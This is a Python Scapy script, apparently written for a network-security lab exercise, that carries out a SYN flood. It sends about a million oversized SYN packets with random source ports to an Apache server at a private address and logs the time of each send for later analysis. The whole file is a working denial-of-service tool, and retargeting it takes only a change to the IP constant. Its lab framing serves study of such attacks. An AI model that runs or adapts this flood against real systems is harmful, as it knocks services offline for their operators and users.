from scapy.all import * 
import numpy as np
import time
import argparse

# Argument parser setup
parser = argparse.ArgumentParser(description="SYN Flood Attack Script")
parser.add_argument("--ineer", type=int, default=10000, help="Number of inner loops")
parser.add_argument("--outer", type=int, default=100, help="Number of outer loops")

args = parser.parse_args()


#Constants
INEER_LOOPS = args.ineer
OUTER_LOOPS = args.outer
TARGET_IP = "10.9.0.4"  #The target ip, the ip of the apache http server were attacking
TARGET_PORT = 80 #The target port, the port of the apache http server were attacking

#Function to send the packets
def attack():
    start_time = time.time() #Get the start time of the attack
    index_time = np.zeros((INEER_LOOPS*OUTER_LOOPS,2)) #List to store the index and time of each packet sent

    index = 0
    for i in range(OUTER_LOOPS): #Loop 100 times
        for j in range(INEER_LOOPS): #Loop 10000 times, overall sending 1 million packets
            ip = IP(dst=TARGET_IP) #The IP layer

            tcp = TCP(sport=RandShort(),dport= TARGET_PORT, flags="S") #The TCP layer, we set the source port to a random number, the destination port to the target port and the flags to S (SYN)

            raw = Raw(b"X"*1024) #Add additional data to the packet, to make it bigger

            p = ip/tcp/raw #Constuct the packet, layer by layer

            send(p, loop=0, verbose=0) #Send the packet in a loop, verbose=0 to suppress output
            index_time[index] = [index, time.time()] #Store the index and the time the packet was sent, for later analysis
            index += 1
            
            if (j + 1) % 1000 == 0:  # Print after every 1000 iterations
                print(f"Sent {j + 1} packets in iteration {i + 1}")
                
    time_diff = np.diff(index_time[:, 1]) #Calculate the time difference between each packet sent, to know how long it took to send each packet
    time_diff = np.insert(time_diff, 0, index_time[0, 1] - start_time)
    return time_diff






        

if __name__ == '__main__':
    index_time = attack() #Start the attack and get the time difference between each packet sent
    avg_time_took = np.mean(index_time)#Calculate the average time it took to send a packet
    print(f"The avg time took to send a packet: {avg_time_took}")
    with open('./syns_result_p.txt', 'w') as file: #Write the index and time difference to a file as requested
        for i in range(len(index_time)):
            time_diff = index_time[i]
            file.write(f"{i} {time_diff}\n") #Write the index and time difference to the file




























